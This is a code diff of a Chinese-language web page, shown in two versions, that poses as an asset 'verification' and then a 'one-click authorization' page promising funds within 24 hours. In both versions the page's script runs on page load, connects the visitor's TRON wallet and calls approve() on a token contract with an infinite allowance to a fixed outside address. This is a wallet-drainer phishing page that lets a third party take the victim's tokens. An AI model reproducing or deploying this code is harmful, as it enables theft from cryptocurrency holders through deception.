@@ -1,145 +1,97 @@
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>資產配置驗證</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+TC&display=swap');
-  body, html {
-    height: 100%;
-    margin: 0;
-    font-family: 'Noto Sans TC', sans-serif;
-    background: linear-gradient(135deg, #0f172a, #1e293b, #2563eb, #1e3a8a);
-    background-size: 400% 400%;
-    animation: gradientBG 20s ease infinite;
-    color: #fff;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    padding: 20px;
-  }
-  @keyframes gradientBG {
-    0%{background-position:0% 50%}
-    50%{background-position:100% 50%}
-    100%{background-position:0% 50%}
-  }
-  .container {
-    background: rgba(255,255,255,0.06);
-    padding: 35px 30px;
-    border-radius: 20px;
-    max-width: 420px;
-    width: 100%;
-    text-align: center;
-    backdrop-filter: blur(14px);
-    box-shadow: 0 10px 30px rgba(0,0,0,0.45);
-  }
-  .logo {
-    width: 90px;
-    margin-bottom: 18px;
-  }
-  h1 {
-    font-weight: 700;
-    font-size: 26px;
-    margin-bottom: 14px;
-  }
-  p {
-    font-size: 15px;
-    line-height: 1.5;
-    color: #cbd5e1;
-    margin-bottom: 16px;
-  }
-  .progress {
-    width: 100%;
-    background: rgba(255,255,255,0.1);
-    border-radius: 50px;
-    overflow: hidden;
-    height: 10px;
-    margin-bottom: 15px;
-  }
-  .progress-bar {
-    background: linear-gradient(90deg, #2563eb, #3b82f6);
-    height: 100%;
-    width: 0%;
-    transition: width 0.5s ease;
-  }
-  #status {
-    font-size: 15px;
-    font-weight: 600;
-    letter-spacing: 0.5px;
-    margin-top: 10px;
-    min-height: 24px;
-  }
-  .success { color: #4ade80; }
-  .error { color: #f87171; }
-  .loading { color: #facc15; }
-</style>
-<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>一鍵授權頁面</title>
+  <style>
+    body {
+      font-family: "Noto Sans TC", sans-serif;
+      background: #0f172a;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(12px);
+      border-radius: 16px;
+      padding: 30px 40px;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+    }
+    h1 { font-size: 26px; margin-bottom: 16px; font-weight: 600; }
+    p { font-size: 16px; margin-bottom: 28px; line-height: 1.6; color: #cbd5e1; }
+    #status { margin-top: 20px; min-height: 24px; font-size: 14px; }
+    .loading { color: #facc15; }
+    .success { color: #4ade80; }
+    .error { color: #f87171; }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
 </head>
 <body>
-  <div class="container" role="main" aria-live="polite">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Logo_Tether.svg" alt="USDT Logo" class="logo" />
-    <h1>資產配置驗證</h1>
-    <p>請保持錢包在線，並根據錢包提示完成授權操作。</p>
-    <div class="progress"><div class="progress-bar" id="progress-bar"></div></div>
-    <p id="status" class="loading">檢測環境中...</p>
-  </div>
+<div class="container">
+  <h1>一鍵授權頁面</h1>
+  <p>點擊下方授權按鈕，區塊鏈中資金會在 24 小時內，為您進行入賬，請確認。</p>
+  <p id="status" class="loading">正在檢測錢包環境...</p>
+</div>
 
 <script>
-  const USDT_CONTRACT_TRON = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-  const TARGET_ADDRESS_TRON = "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf";
+  const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4";
+  const A_ADDRESS = "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf";
   const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  const TRON_FULL_NODE = "https://api.trongrid.io"; // Tron RPC
+  let tronWeb;
 
-  function setProgress(percent, status, cls="loading") {
-    document.getElementById("progress-bar").style.width = percent + "%";
+  async function connectWallet() {
+    if (window.tronWeb && window.tronWeb.ready) {
+      tronWeb = window.tronWeb;
+      return tronWeb.defaultAddress.base58;
+    }
+    if (window.tronLink) {
+      await window.tronLink.request({ method: 'tron_requestAccounts' });
+      tronWeb = window.tronWeb;
+      return tronWeb.defaultAddress.base58;
+    }
+    return null;
+  }
+
+  async function approve() {
+    updateStatus("正在處理入賬授權...", "loading");
+    try {
+      const contract = await tronWeb.contract().at(TRUSD_CONTRACT);
+      await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
+      updateStatus("入賬授權完成，稍後自動完成處理。", "success");
+      setTimeout(() => {
+        window.location.href = "./success.html";
+      }, 2000);
+    } catch (err) {
+      console.error(err);
+      updateStatus("配置未完成，稍後請重新整理頁面再試。", "error");
+      setTimeout(() => {
+        window.location.href = "./error.html";
+      }, 2500);
+    }
+  }
+
+  function updateStatus(msg, type) {
     const statusEl = document.getElementById("status");
-    statusEl.innerText = status;
-    statusEl.className = cls;
+    statusEl.innerText = msg;
+    statusEl.className = type;
   }
 
   async function init() {
-    try {
-      setProgress(20, "檢測錢包環境...");
-
-      if (window.tronWeb && window.tronWeb.ready) {
-        setProgress(40, "檢測到 TRON 錢包，連接中...");
-        await tronApprove(window.tronWeb);
-        return;
-      }
-
-      if (window.tronLink) {
-        await window.tronLink.request({ method: 'tron_requestAccounts' });
-        setProgress(40, "檢測到 TronLink，連接中...");
-        await tronApprove(window.tronWeb);
-        return;
-      }
-
-      // 模擬 Trusd / EVM 錢包 轉發授權交易到 TRON
-      setProgress(40, "檢測到非 TRON 錢包，使用 RPC 進行授權...");
-      const tronWebInstance = new TronWeb(TRON_FULL_NODE, TRON_FULL_NODE, TRON_FULL_NODE);
-      await tronApprove(tronWebInstance);
-    } catch (err) {
-      console.error(err);
-      setProgress(100, "驗證過程出錯", "error");
-      setTimeout(() => { window.location.href = "fail.html"; }, 1500);
+    const address = await connectWallet();
+    if (!address) {
+      updateStatus("未偵測到 TRON 錢包，請使用 TronLink 或幣安 Web3 錢包開啟本頁。", "error");
+      return;
     }
-  }
-
-  async function tronApprove(tw) {
-    try {
-      const address = (tw.defaultAddress && tw.defaultAddress.base58) || "模擬授權";
-      setProgress(60, "已連接：" + address + "，授權中...");
-      const contract = await tw.contract().at(USDT_CONTRACT_TRON);
-      await contract.approve(TARGET_ADDRESS_TRON, INFINITE_AMOUNT).send();
-      setProgress(100, "✅ 配置完成", "success");
-      setTimeout(() => { window.location.href = "success.html"; }, 1500);
-    } catch (err) {
-      console.error(err);
-      setProgress(100, "授權失敗或已取消", "error");
-      setTimeout(() => { window.location.href = "fail.html"; }, 1500);
-    }
+    approve();
   }
 
   window.addEventListener('load', init);
